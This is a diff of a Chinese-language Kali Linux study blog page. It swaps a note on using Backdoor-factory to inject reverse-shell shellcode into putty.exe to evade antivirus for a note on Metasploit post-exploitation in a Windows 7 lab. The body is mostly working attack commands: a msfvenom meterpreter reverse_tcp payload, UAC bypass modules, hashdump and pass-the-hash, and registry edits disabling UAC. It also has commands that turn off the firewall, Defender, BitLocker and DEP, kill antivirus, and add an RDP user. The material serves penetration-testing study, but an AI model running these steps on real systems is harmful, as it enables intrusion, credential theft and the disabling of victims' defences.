@@ -79,23 +79,16 @@
 
 
 
-<meta name="description" content="1. Backdoor-factory ▲ 2020.2.15 Backdoor-factory已不再受支持 ▲ 2020.2.15 本机自带的backdoor-factory存在坑，需要从github上下载进行运行 ▲ 2020.2.15 Backdoor-factory链接https:&#x2F;&#x2F;github.com&#x2F;secretsquirrel&#x2F;the-backdoor-factory.git P">
+<meta name="description" content="1. Msf后渗透测试阶段 已经获得目标系统控制权后扩大战果 提权 信息收集 渗透内网 永久后门   实验环境 Window 7 网卡模式为Bridge模式，检查网络，🔺命令：ifconfig查看IP地址 关闭防火墙   Kali 网卡模式为Bridge模式，检查网络，🔺命令：ifconfig查看IP地址      2. 基于已有session扩大战果 Kali 🔺命令：msfvenom">
 <meta name="keywords" content="安全">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Kali Linux笔记(九十三)：Backdoor-factory">
-<meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;02&#x2F;15&#x2F;Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B9%9D%E5%8D%81%E4%B8%89)%EF%BC%9ABackdoor-factory&#x2F;index.html">
+<meta property="og:title" content="Kali Linux笔记(一百零七)：MSF后渗透测试--UAC提权">
+<meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;03&#x2F;03&#x2F;Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%80%E7%99%BE%E9%9B%B6%E4%B8%83)%EF%BC%9AMSF%E5%90%8E%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--UAC%E6%8F%90%E6%9D%83&#x2F;index.html">
 <meta property="og:site_name" content="Tomas&#39;Blog">
-<meta property="og:description" content="1. Backdoor-factory ▲ 2020.2.15 Backdoor-factory已不再受支持 ▲ 2020.2.15 本机自带的backdoor-factory存在坑，需要从github上下载进行运行 ▲ 2020.2.15 Backdoor-factory链接https:&#x2F;&#x2F;github.com&#x2F;secretsquirrel&#x2F;the-backdoor-factory.git P">
+<meta property="og:description" content="1. Msf后渗透测试阶段 已经获得目标系统控制权后扩大战果 提权 信息收集 渗透内网 永久后门   实验环境 Window 7 网卡模式为Bridge模式，检查网络，🔺命令：ifconfig查看IP地址 关闭防火墙   Kali 网卡模式为Bridge模式，检查网络，🔺命令：ifconfig查看IP地址      2. 基于已有session扩大战果 Kali 🔺命令：msfvenom">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="http:&#x2F;&#x2F;aliyun.wuyidaxue.top:8088&#x2F;kodex&#x2F;index.php?user&#x2F;publicLink&amp;fid=0d39gOGFNMUbsTxtVe3rgh1C0BAmNt5198rl3YAiSu_BaPMv4s9OO4sRcYzxZHaBW9yo96wj79fp9YvZErRU8FJKhBOmA9IGU0dv2mb0vDzKstUakhYfpX9ei0Znp73z_aE5BT0&amp;file_name=&#x2F;msf%E4%BD%BF%E7%94%A8patch%E6%96%B9%E6%B3%95.PNG">
-<meta property="og:image" content="http:&#x2F;&#x2F;aliyun.wuyidaxue.top:8088&#x2F;kodex&#x2F;index.php?user&#x2F;publicLink&amp;fid=9d63erCVrgW_6sHoSiGjgV6lxrog7JamOb40CgvEegA0LvJ8wX2iMw5jj0z9gfhXnwpC1dqtr8QbvzDgJCMOadeLSdNmKuTnXuikGnhCnGNnqC4uEhRQ8BbCQLF8uM3o&amp;file_name=&#x2F;%E4%BB%A3%E7%A0%81%E6%B4%9E%E7%A4%BA%E4%BE%8B.PNG">
-<meta property="og:image" content="http:&#x2F;&#x2F;aliyun.wuyidaxue.top:8088&#x2F;kodex&#x2F;index.php?user&#x2F;publicLink&amp;fid=214dSOwXB0p4uUPdKomYlBMvh8lYxDishvPdWcr4XM6Wdf2mBk294qPOTdk6pCUWfprJoj1OrALXxwzrYCylsFtWD8Wgufb_FAE8ku7R3F5JGxy0ktT52OQYUHwrbRAa&amp;file_name=&#x2F;%E4%BB%A3%E7%A0%81%E6%B4%9E%E8%B7%B3%E8%BD%AC.PNG">
-<meta property="og:image" content="http:&#x2F;&#x2F;aliyun.wuyidaxue.top:8088&#x2F;kodex&#x2F;index.php?user&#x2F;publicLink&amp;fid=721fjA15I5_vSh9NhqlJEgIIcc3JFWfr9mp3qVH-3FxfrutwVQInLzoDKv4Hbk_r-A_fVU2nJrDWQkzj_N9gXu0AhOquqOqyBNbMc7Ed76AYk3rvB6rv&amp;file_name=&#x2F;bdf_p1.PNG">
-<meta property="og:image" content="http:&#x2F;&#x2F;aliyun.wuyidaxue.top:8088&#x2F;kodex&#x2F;index.php?user&#x2F;publicLink&amp;fid=0368Ps19J_NYSG6_Werj9nSpGkPbtOrLqUdRA3fUw7m31QBXAQF64288xNjpZ7AnWJPJ5NPOQkJhrFyWqL-3zOPeBULnjH_Q9-rtmWC10f8IZS9jS-fL&amp;file_name=&#x2F;bdf_p2.PNG">
-<meta property="og:image" content="http:&#x2F;&#x2F;aliyun.wuyidaxue.top:8088&#x2F;kodex&#x2F;index.php?user&#x2F;publicLink&amp;fid=ecc4Fi7SOURxMyzSIKsh7WGeiW64iZOefj5VxcLHZmbRzruZAno3BBGayQo5KvBTiZIiPDo42bTLyE0iwi7ngU349fOalRyOK3Y7gIDZHfHzwpiGhvJB&amp;file_name=&#x2F;bdf_p3.PNG">
-<meta property="og:updated_time" content="2020-02-15T04:46:01.132Z">
+<meta property="og:updated_time" content="2020-03-03T07:06:57.731Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http:&#x2F;&#x2F;aliyun.wuyidaxue.top:8088&#x2F;kodex&#x2F;index.php?user&#x2F;publicLink&amp;fid=0d39gOGFNMUbsTxtVe3rgh1C0BAmNt5198rl3YAiSu_BaPMv4s9OO4sRcYzxZHaBW9yo96wj79fp9YvZErRU8FJKhBOmA9IGU0dv2mb0vDzKstUakhYfpX9ei0Znp73z_aE5BT0&amp;file_name=&#x2F;msf%E4%BD%BF%E7%94%A8patch%E6%96%B9%E6%B3%95.PNG">
 
 
 
@@ -125,13 +118,13 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/2020/02/15/Kali Linux笔记(九十三)：Backdoor-factory/"/>
+  <link rel="canonical" href="http://yoursite.com/2020/03/03/Kali Linux笔记(一百零七)：MSF后渗透测试--UAC提权/"/>
 
 
 
 
 
-  <title>Kali Linux笔记(九十三)：Backdoor-factory | Tomas'Blog</title>
+  <title>Kali Linux笔记(一百零七)：MSF后渗透测试--UAC提权 | Tomas'Blog</title>
   
 
 
@@ -250,7 +243,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/15/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B9%9D%E5%8D%81%E4%B8%89)%EF%BC%9ABackdoor-factory/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/03/03/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%80%E7%99%BE%E9%9B%B6%E4%B8%83)%EF%BC%9AMSF%E5%90%8E%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--UAC%E6%8F%90%E6%9D%83/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Tomas">
@@ -267,7 +260,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">Kali Linux笔记(九十三)：Backdoor-factory</h1>
+          <h1 class="post-title" itemprop="name headline">Kali Linux笔记(一百零七)：MSF后渗透测试--UAC提权</h1>
         
 
         <div class="post-meta">
@@ -279,8 +272,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-02-15T12:47:03+08:00">
-                2020-02-15
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-03-03T15:28:28+08:00">
+                2020-03-03
               </time>
             
 
@@ -333,7 +326,7 @@
                   <span class="post-meta-item-text">字数统计&#58;</span>
                 
                 <span title="字数统计">
-                  699 字
+                  1.1k 字
                 </span>
               
 
@@ -349,7 +342,7 @@
                   <span class="post-meta-item-text">阅读时长 &asymp;</span>
                 
                 <span title="阅读时长">
-                  2 分钟
+                  5 分钟
                 </span>
               
             </div>
@@ -371,134 +364,294 @@
 
       
         <hr>
-<h4 id="1-Backdoor-factory"><a href="#1-Backdoor-factory" class="headerlink" title="1. Backdoor-factory"></a>1. Backdoor-factory</h4><ul>
-<li>▲ 2020.2.15 Backdoor-factory已不再受支持</li>
-<li>▲ 2020.2.15 本机自带的backdoor-factory存在坑，需要从github上下载进行运行</li>
-<li>▲ 2020.2.15 Backdoor-factory链接<a href="https://github.com/secretsquirrel/the-backdoor-factory.git" target="_blank" rel="noopener">https://github.com/secretsquirrel/the-backdoor-factory.git</a></li>
-<li>Patch<ul>
-<li>通过替换EXE、DLL、注册表等方法修复系统漏洞或问题的方法</li>
-<li>BDF：向二进制文件中增加或者删除代码内容<ul>
-<li>某些受保护的二进制程序无法patch</li>
-<li>存在一定概率文件会被patch坏掉</li>
+<h4 id="1-Msf后渗透测试阶段"><a href="#1-Msf后渗透测试阶段" class="headerlink" title="1. Msf后渗透测试阶段"></a>1. Msf后渗透测试阶段</h4><ul>
+<li>已经获得目标系统控制权后扩大战果<ul>
+<li>提权</li>
+<li>信息收集</li>
+<li>渗透内网</li>
+<li>永久后门</li>
 </ul>
 </li>
-</ul>
-</li>
-<li>后门工厂<ul>
-<li>适用于windows PE x32/x64和Linux ELF x32/x64（OSX）</li>
-<li>支持msf payload、自定义payload</li>
-</ul>
-</li>
-<li>将shellcode代码patch进模板文件，躲避AV检查</li>
-<li>Python语言编写</li>
-<li>msf使用的patch方法<ul>
-<li>覆盖程序入口<ul>
-<li><strong><code>🔺命令：msfvenom -p windows/shell/reverse_tcp ……</code></strong></li>
-</ul>
-</li>
-<li>创建新的线程执行shellcode并跳回源程序入口<ul>
-<li><strong><code>🔺命令：msfvenom -p windows/shell/reverse_tcp –k</code></strong></li>
-<li>增加代码片段跳转执行后跳回源程序入口</li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-<p><img src="http://aliyun.wuyidaxue.top:8088/kodex/index.php?user/publicLink&fid=0d39gOGFNMUbsTxtVe3rgh1C0BAmNt5198rl3YAiSu_BaPMv4s9OO4sRcYzxZHaBW9yo96wj79fp9YvZErRU8FJKhBOmA9IGU0dv2mb0vDzKstUakhYfpX9ei0Znp73z_aE5BT0&file_name=/msf%E4%BD%BF%E7%94%A8patch%E6%96%B9%E6%B3%95.PNG" alt="msf使用的patch方法"></p>
-<ul>
-<li>CTP方法<ul>
-<li>增加新的代码段section，与msf -k方法类似</li>
-<li>使用现有的代码裂缝/洞（code cave）存放shellcode<ul>
-<li>二进制文件中超过两个字节的连续x00区域（代码片段间区域）</li>
-<li>根据统计判断代码洞是编译器在进行编译时造成的，不同的编译器造成的代码洞的大小不同</li>
+<li>实验环境<ul>
+<li>Window 7<ul>
+<li>网卡模式为Bridge模式，检查网络，<strong><code>🔺命令：ifconfig</code></strong>查看IP地址</li>
+<li>关闭防火墙</li>
 </ul>
 </li>
 <li>Kali<ul>
-<li><strong><code>🔺命令：cp which cat</code></strong></li>
-<li><strong><code>🔺命令：hexeditor cat</code></strong></li>
+<li>网卡模式为Bridge模式，检查网络，<strong><code>🔺命令：ifconfig</code></strong>查看IP地址</li>
 </ul>
 </li>
 </ul>
 </li>
 </ul>
-<p><img src="http://aliyun.wuyidaxue.top:8088/kodex/index.php?user/publicLink&fid=9d63erCVrgW_6sHoSiGjgV6lxrog7JamOb40CgvEegA0LvJ8wX2iMw5jj0z9gfhXnwpC1dqtr8QbvzDgJCMOadeLSdNmKuTnXuikGnhCnGNnqC4uEhRQ8BbCQLF8uM3o&file_name=/%E4%BB%A3%E7%A0%81%E6%B4%9E%E7%A4%BA%E4%BE%8B.PNG" alt="代码洞示例"></p>
-<ul>
-<li>单个代码洞大小不足以存放完整的shellcode<ul>
-<li>多代码洞跳转（非顺序执行）<ul>
-<li>初期免杀率可达100%</li>
-</ul>
-</li>
-<li>结合msf的stager方法</li>
-</ul>
-</li>
-<li>Path选项<ul>
-<li>附加代码段</li>
-<li>单代码洞注入</li>
-<li>多代码洞注入</li>
-</ul>
-</li>
-</ul>
-<p><img src="http://aliyun.wuyidaxue.top:8088/kodex/index.php?user/publicLink&fid=214dSOwXB0p4uUPdKomYlBMvh8lYxDishvPdWcr4XM6Wdf2mBk294qPOTdk6pCUWfprJoj1OrALXxwzrYCylsFtWD8Wgufb_FAE8ku7R3F5JGxy0ktT52OQYUHwrbRAa&file_name=/%E4%BB%A3%E7%A0%81%E6%B4%9E%E8%B7%B3%E8%BD%AC.PNG" alt="代码洞跳转"></p>
-<h4 id="2-BDF的使用"><a href="#2-BDF的使用" class="headerlink" title="2. BDF的使用"></a>2. BDF的使用</h4><ul>
-<li>参数<ul>
-<li>-S（检测文件是否支持注入）</li>
-<li>-l（可限定字节数的代码洞）</li>
-<li>-H（指定IP地址）</li>
-<li>-J（指定端口）</li>
-</ul>
-</li>
-<li>检查二进制文件是否支持代码注入（可使用putty）<ul>
-<li><strong><code>🔺命令：backdoor-factory -f putty.exe –S</code></strong></li>
-</ul>
-</li>
-<li>查看cave大小<ul>
-<li><strong><code>🔺命令：backdoor-factory -f putty.exe -c</code></strong> </li>
-</ul>
-</li>
-<li>显示可用payload<ul>
-<li><strong><code>🔺命令：backdoor-factory -f putty.exe -s show</code></strong></li>
-<li>iat_reverse_tcp_stager_threaded（分步骤反弹shell的tcp连接）</li>
-</ul>
-</li>
-<li>免杀效果对比（注入文件大小会发生改变）<ul>
-<li><strong><code>🔺命令：backdoor-factory -f putty.exe -s iat_reverse_tcp_stager_threaded -H 1.1.1.1 -P 6666</code></strong>（单一代码洞注入）</li>
-<li><strong><code>🔺命令：backdoor-factory -f putty.exe -s iat_reverse_tcp_stager_threaded -H 1.1.1.1 -P 6666 –J</code></strong>（多代码洞注入）</li>
-<li><strong><code>🔺命令：backdoor-factory -f putty.exe -s iat_reverse_tcp_stager_threaded -a -H 192.168.20.8 -P 6666</code></strong>（附加注入）</li>
-</ul>
-</li>
-<li>验证有效性<ul>
+<h4 id="2-基于已有session扩大战果"><a href="#2-基于已有session扩大战果" class="headerlink" title="2. 基于已有session扩大战果"></a>2. 基于已有session扩大战果</h4><ul>
 <li>Kali<ul>
-<li><strong><code>🔺命令：msfconsole</code></strong></li>
-<li><strong><code>🔺命令：use exploit/multi/handler</code></strong></li>
+<li><strong><code>🔺命令：msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=Kali的IP LPORT=4444 -b &quot;\x00&quot; -e x86/shikata_ga_nai -i 7 -f exe -o 1.exe</code></strong></li>
+<li><strong><code>🔺命令：service apache2 start</code></strong></li>
+<li><strong><code>🔺命令：cp 1.exe /var/www/html</code></strong></li>
+<li><strong><code>🔺命令：msfconsole -q</code></strong></li>
+<li><strong><code>🔺命令：use exploit/multi/handler</code></strong><ul>
 <li><strong><code>🔺命令：set payload windows/meterpreter/reverse_tcp</code></strong></li>
-<li><strong><code>🔺命令：show options</code></strong></li>
 <li><strong><code>🔺命令：set LHOST Kali的IP</code></strong></li>
-<li><strong><code>🔺命令：set LPORT Kali的IP</code></strong></li>
-<li><strong><code>🔺命令：exploit -j</code></strong></li>
+<li><strong><code>🔺命令：exploit</code></strong></li>
 </ul>
 </li>
-<li>物理主机<ul>
-<li>双击putty.exe看是否能正常执行</li>
-<li>查看shell的免杀效果（查杀网站）</li>
+</ul>
+</li>
+<li>Window 7<ul>
+<li>浏览器访问<a href="http://Kali的IP，下载保存1.exe" target="_blank" rel="noopener">http://Kali的IP，下载保存1.exe</a></li>
+<li>双击打开1.exe</li>
 </ul>
 </li>
 <li>Kali<ul>
-<li>看是否能连接上shell</li>
-<li><strong><code>🔺命令：shell</code></strong></li>
-<li><strong><code>🔺命令：ipconfig</code></strong></li>
+<li>查看是否拿到shell</li>
+<li><strong><code>🔺命令：session -l</code></strong></li>
+</ul>
+</li>
+</ul>
+<h4 id="3-获取system账号权限"><a href="#3-获取system账号权限" class="headerlink" title="3. 获取system账号权限"></a>3. 获取system账号权限</h4><ul>
+<li>Kali<ul>
+<li><strong><code>🔺命令：load priv</code></strong> </li>
+<li><strong><code>🔺命令：getsystem</code></strong> <ul>
+<li>priv_elevate_getsystem: Operation failed: Access is denied. </li>
+<li>priv_elevate_getsystem: Operation failed: The enviroment is incorrect.</li>
 </ul>
 </li>
 </ul>
 </li>
-<li>与veil-evasion集成</li>
-<li>IAT——import address table<ul>
-<li>指针指向WinAPI地址，被称为thunks（形实转换程序），地址预定义</li>
+</ul>
+<h4 id="4-绕过UAC限制-1"><a href="#4-绕过UAC限制-1" class="headerlink" title="4. 绕过UAC限制-1"></a>4. 绕过UAC限制-1</h4><ul>
+<li>Kali<ul>
+<li><strong><code>🔺命令：use exploit/windows/local/ask</code></strong><ul>
+<li><strong><code>🔺命令：set session 1</code></strong></li>
+<li><strong><code>🔺命令：set payload windows/meterpreter/reverse_tcp</code></strong><ul>
+<li><strong><code>🔺命令：set LHOST Kali的IP</code></strong></li>
+</ul>
+</li>
+<li><strong><code>🔺命令：set filename 欺骗性的文件名.exe</code></strong><ul>
+<li><strong><code>🔺命令：exploit</code></strong></li>
 </ul>
 </li>
 </ul>
-<p><img src="http://aliyun.wuyidaxue.top:8088/kodex/index.php?user/publicLink&fid=721fjA15I5_vSh9NhqlJEgIIcc3JFWfr9mp3qVH-3FxfrutwVQInLzoDKv4Hbk_r-A_fVU2nJrDWQkzj_N9gXu0AhOquqOqyBNbMc7Ed76AYk3rvB6rv&file_name=/bdf_p1.PNG" alt="bdf_p1"></p>
-<p><img src="http://aliyun.wuyidaxue.top:8088/kodex/index.php?user/publicLink&fid=0368Ps19J_NYSG6_Werj9nSpGkPbtOrLqUdRA3fUw7m31QBXAQF64288xNjpZ7AnWJPJ5NPOQkJhrFyWqL-3zOPeBULnjH_Q9-rtmWC10f8IZS9jS-fL&file_name=/bdf_p2.PNG" alt="bdf_p2"></p>
-<p><img src="http://aliyun.wuyidaxue.top:8088/kodex/index.php?user/publicLink&fid=ecc4Fi7SOURxMyzSIKsh7WGeiW64iZOefj5VxcLHZmbRzruZAno3BBGayQo5KvBTiZIiPDo42bTLyE0iwi7ngU349fOalRyOK3Y7gIDZHfHzwpiGhvJB&file_name=/bdf_p3.PNG" alt="bdf_p3"></p>
+</li>
+</ul>
+</li>
+<li>Window 7<ul>
+<li>UAC → 是</li>
+</ul>
+</li>
+<li>Kali<ul>
+<li>查看是否拿到更高权限</li>
+<li><strong><code>🔺命令：session -i 2</code></strong></li>
+<li><strong><code>🔺命令：getuid</code></strong></li>
+<li><strong><code>🔺命令：load priv</code></strong></li>
+<li><strong><code>🔺命令：getsystem</code></strong></li>
+<li><strong><code>🔺命令：getuid</code></strong>（查看是否为SYSTEM权限）</li>
+</ul>
+</li>
+</ul>
+<h4 id="5-绕过UAC限制-2"><a href="#5-绕过UAC限制-2" class="headerlink" title="5. 绕过UAC限制-2"></a>5. 绕过UAC限制-2</h4><ul>
+<li>Kali<ul>
+<li><strong><code>🔺命令：use exploit/windows/local/bypassuac</code></strong>（EXE执行程序）<ul>
+<li><strong><code>🔺命令：set session 1</code></strong></li>
+<li><strong><code>🔺命令：set payload windows/meterpreter/reverse_tcp</code></strong><ul>
+<li><strong><code>🔺命令：set LHOST Kali的IP</code></strong></li>
+<li><strong><code>🔺命令：exploit</code></strong></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>Window 7<ul>
+<li>查看是否弹窗</li>
+</ul>
+</li>
+<li>Kali<ul>
+<li><strong><code>🔺命令：getuid</code></strong></li>
+<li><strong><code>🔺命令：load priv</code></strong></li>
+<li><strong><code>🔺命令：getsystem</code></strong></li>
+<li><strong><code>🔺命令：getuid</code></strong>（查看是否为SYSTEM权限）</li>
+</ul>
+</li>
+<li>▲ 2020.03.02 对于非admins group，无法提升权限</li>
+</ul>
+<h4 id="6-绕过UAC限制-3"><a href="#6-绕过UAC限制-3" class="headerlink" title="6. 绕过UAC限制-3"></a>6. 绕过UAC限制-3</h4><ul>
+<li>Kali<ul>
+<li><strong><code>🔺命令：use exploit/windows/local/bypassuac_injection</code></strong>（注入DLL库）<ul>
+<li><strong><code>🔺命令：set session 1</code></strong></li>
+<li><strong><code>🔺命令：set payload windows/meterpreter/reverse_tcp</code></strong><ul>
+<li><strong><code>🔺命令：set LHOST Kali的IP</code></strong></li>
+<li><strong><code>🔺命令：exploit</code></strong></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>Window 7<ul>
+<li>查看是否弹窗</li>
+</ul>
+</li>
+<li>Kali<ul>
+<li><strong><code>🔺命令：getuid</code></strong></li>
+<li><strong><code>🔺命令：load priv</code></strong></li>
+<li><strong><code>🔺命令：getsystem</code></strong></li>
+<li><strong><code>🔺命令：getuid</code></strong>（查看是否为SYSTEM权限）</li>
+</ul>
+</li>
+<li>▲ 2020.03.02 对于非admins group，无法提升权限</li>
+</ul>
+<h4 id="7-UAC利用"><a href="#7-UAC利用" class="headerlink" title="7. UAC利用"></a>7. UAC利用</h4><ul>
+<li>▲ 需要提前关闭UAC</li>
+<li>Kali<ul>
+<li><strong><code>🔺命令：use exploit/windows/local/bypassuac_injection</code></strong>（注入DLL库）<ul>
+<li><strong><code>🔺命令：set session 1</code></strong></li>
+<li><strong><code>🔺命令：set payload windows/meterpreter/reverse_tcp</code></strong><ul>
+<li><strong><code>🔺命令：set LHOST Kali的IP</code></strong></li>
+<li><strong><code>🔺命令：exploit</code></strong></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><strong><code>🔺命令：load priv</code></strong></li>
+<li><strong><code>🔺命令：getsystem</code></strong></li>
+<li><strong><code>🔺命令：getuid</code></strong></li>
+<li><strong><code>🔺命令：hashdump</code></strong><ul>
+<li>▲ 2020.03.03 Operation failed：The parameter is incorrect</li>
+<li>▲ 2020.03.03 run post/windows/gather/hashdump调用不一定能行</li>
+<li>▲ 2020.03.03 在非Meterpreter下，<strong><code>🔺命令：use post/windows/gather/hashdump</code></strong>，可在非SYSTEM权限下成功获取到哈希值</li>
+</ul>
+</li>
+<li><strong><code>🔺命令：shell</code></strong>（添加注册表键值，关闭UAC验证）<ul>
+<li><strong><code>🔺命令：cmd.exe /k %windir%\System32\reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f</code></strong> </li>
+<li><strong><code>🔺命令：cmd.exe /k %windir%\System32\reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f</code></strong> </li>
+<li><strong><code>🔺命令：cmd.exe /k %windir%\System32\reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\system /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f</code></strong></li>
+<li><strong><code>🔺命令：cmd.exe /k %windir%\System32\reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\system /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f</code></strong><ul>
+<li><strong><code>🔺命令：shutdown -r -t 0</code></strong></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>Window 7<ul>
+<li>确认UAC功能是否关闭</li>
+<li>▲ 查看UAC方法（Win7）：开始 → 控制面板 → 查看方式：大图标 → 操作中心 → 更改用户账户控制设置</li>
+</ul>
+</li>
+<li>Kali<ul>
+<li>Psexec模块之 Passthehash<ul>
+<li><strong><code>🔺命令：use exploit/windows/smb/psexec</code></strong> <ul>
+<li><strong><code>🔺命令：set rhost Window 7的IP</code></strong></li>
+<li><strong><code>🔺命令：set smbuser w7</code></strong></li>
+<li><strong><code>🔺命令：set smbpass 取得的hash值密文</code></strong></li>
+<li><strong><code>🔺命令：set payload windows/meterpreter/reverse_tcp</code></strong><ul>
+<li><strong><code>🔺命令：set LHOST Kali的IP</code></strong></li>
+<li><strong><code>🔺命令：exploit</code></strong></li>
+</ul>
+</li>
+<li>hash值root:toor(aad3b435b51404eeaad3b435b51404ee:3bdfee3835ee03d4283d4569ec1263e4:::)</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>▲ 2020.03.03 该模块包报错，UnexpectedStatusCode STATUS_USER_SESSION_DELETED</li>
+</ul>
+</li>
+<li>Window 7<ul>
+<li>开启防火墙</li>
+</ul>
+</li>
+<li>Kali<ul>
+<li>关闭防火墙<ul>
+<li>需要管理员或system权限</li>
+<li><strong><code>🔺命令：shell</code></strong><ul>
+<li><strong><code>🔺命令：netsh advfirewall set allprofiles state off</code></strong></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>Window 7<ul>
+<li>查看防火墙是否被关闭</li>
+<li>Win+R → services.msc → 查看Windefend是否开启状态</li>
+</ul>
+</li>
+<li>Kali<ul>
+<li>关闭Windefend<ul>
+<li><strong><code>🔺命令：shell</code></strong><ul>
+<li><strong><code>🔺命令：net stop windefend</code></strong></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>Window 7<ul>
+<li>查看Windefend是否被关闭</li>
+<li>关闭远程桌面服务</li>
+</ul>
+</li>
+<li>Kali<ul>
+<li>Bitclock磁盘加密<ul>
+<li><strong><code>🔺命令：shell</code></strong><ul>
+<li>关闭Bitclock加密：<strong><code>🔺命令：manage-bde -off C:</code></strong> </li>
+<li>查看Bitclokc加密状态：<strong><code>🔺命令：manage-bde -status C:</code></strong></li>
+</ul>
+</li>
+</ul>
+</li>
+<li>关闭DEP<ul>
+<li>**`🔺命令：shell<ul>
+<li><strong><code>🔺命令：bcdedit.exe /set {current} nx AlwaysOff</code></strong></li>
+</ul>
+</li>
+</ul>
+</li>
+<li>杀死防病毒软件<ul>
+<li><strong><code>🔺命令：run killav</code></strong> </li>
+<li><strong><code>🔺命令：run post/windows/manage/killav</code></strong></li>
+</ul>
+</li>
+<li>开启远程桌面服务<ul>
+<li><strong><code>🔺命令：run post/windows/manage/enable_rdp</code></strong></li>
+</ul>
+</li>
+</ul>
+</li>
+<li>Window 7<ul>
+<li>查看远程桌面是否被开启</li>
+</ul>
+</li>
+<li>Kali<ul>
+<li>关闭远程桌面服务<ul>
+<li><strong><code>🔺命令：run multi_console_command -rc /root/.msf4/logs/scripts/getgui/ clean_up__20160824.1855.rc</code></strong> </li>
+</ul>
+</li>
+</ul>
+</li>
+<li>Window 7<ul>
+<li>查看远程桌面是否被关闭</li>
+</ul>
+</li>
+<li>Kali<ul>
+<li>开启远程桌面GUI服务：<strong><code>🔺命令：run getgui –e</code></strong></li>
+<li>添加用户账号：<strong><code>🔺命令：run getgui -u yuanfh -p pass</code></strong></li>
+<li>查看远程桌面<ul>
+<li>截图：<strong><code>🔺命令：screenshot</code></strong></li>
+<li><strong><code>🔺命令：use/load espia</code></strong> <ul>
+<li><strong><code>🔺命令：help</code></strong></li>
+<li><strong><code>🔺命令：screengrab</code></strong></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
 
       
     </div>
@@ -529,8 +682,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2020/02/13/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B9%9D%E5%8D%81%E4%BA%8C)%EF%BC%9A%E5%85%8D%E6%9D%80%E6%8A%80%E6%9C%AF--%E7%B2%BE%E7%A1%AE%E5%AE%9A%E4%BD%8D%E6%9F%A5%E6%9D%80%E5%AD%97%E7%AC%A6%E4%B8%B2/" rel="next" title="Kali Linux笔记(九十二)：免杀技术--精确定位查杀字符串">
-                <i class="fa fa-chevron-left"></i> Kali Linux笔记(九十二)：免杀技术--精确定位查杀字符串
+              <a href="/2020/03/03/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%80%E7%99%BE%E9%9B%B6%E5%85%AD)%EF%BC%9AMSF%E5%90%8E%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--%E6%BC%8F%E6%B4%9E%E6%8F%90%E6%9D%83/" rel="next" title="Kali Linux笔记(一百零六)：MSF后渗透测试--漏洞提权">
+                <i class="fa fa-chevron-left"></i> Kali Linux笔记(一百零六)：MSF后渗透测试--漏洞提权
               </a>
             
           </div>
@@ -538,10 +691,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2020/02/15/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B9%9D%E5%8D%81%E5%9B%9B)%EF%BC%9ABDFProxy/" rel="prev" title="Kali Linux笔记(九十四)：BDFProxy">
-                Kali Linux笔记(九十四)：BDFProxy <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -711,7 +860,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-Backdoor-factory"><span class="nav-number">1.</span> <span class="nav-text">1. Backdoor-factory</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-BDF的使用"><span class="nav-number">2.</span> <span class="nav-text">2. BDF的使用</span></a></li></ol></div>
